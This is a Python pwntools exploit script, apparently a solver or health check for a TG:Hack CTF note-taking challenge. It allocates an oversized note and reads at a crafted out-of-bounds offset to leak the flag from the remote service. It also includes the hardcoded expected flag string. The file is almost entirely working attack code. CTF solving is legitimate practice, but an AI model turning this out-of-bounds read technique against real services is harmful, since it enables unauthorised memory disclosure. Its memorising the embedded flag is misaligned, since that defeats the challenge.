#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 ./main
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
#host = args.HOST or 'plants.tghack.no'
if args.REGION:
    host = args.REGION + ".plants.tghack.no"
else:
    host = "plants.tghack.no"

port = int(args.PORT or 6004)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def menu(idx):
    io.sendlineafter("> ", str(idx))

def add_note(size, data):
    menu(1)
    io.sendlineafter("size: ", str(size))
    io.sendafter("data: ", data)

def read_note(idx):
    menu(2)
    io.sendlineafter("index: ", str(idx))

def read_note_off(idx, off):
    menu(3)
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("offset: ", str(off))

def delete_note(idx):
    menu(4)
    io.sendlineafter("index: ", str(idx))

add_note(1000000, "A"*0x20)
read_note(0)
read_note_off(0, 0xf8000 - 0x10)
flag = io.recvline()[:-1]
io.close()
log.info("flag: {}".format(flag))
if flag == "TG20{arent_you_tired_of_these_note_taking_services_yet?_e650f8d4343a4278d3450e0a1d737e54}":
    log.info("yay!")
    sys.exit(101)
else:
    sys.exit(102)

#io.interactive()
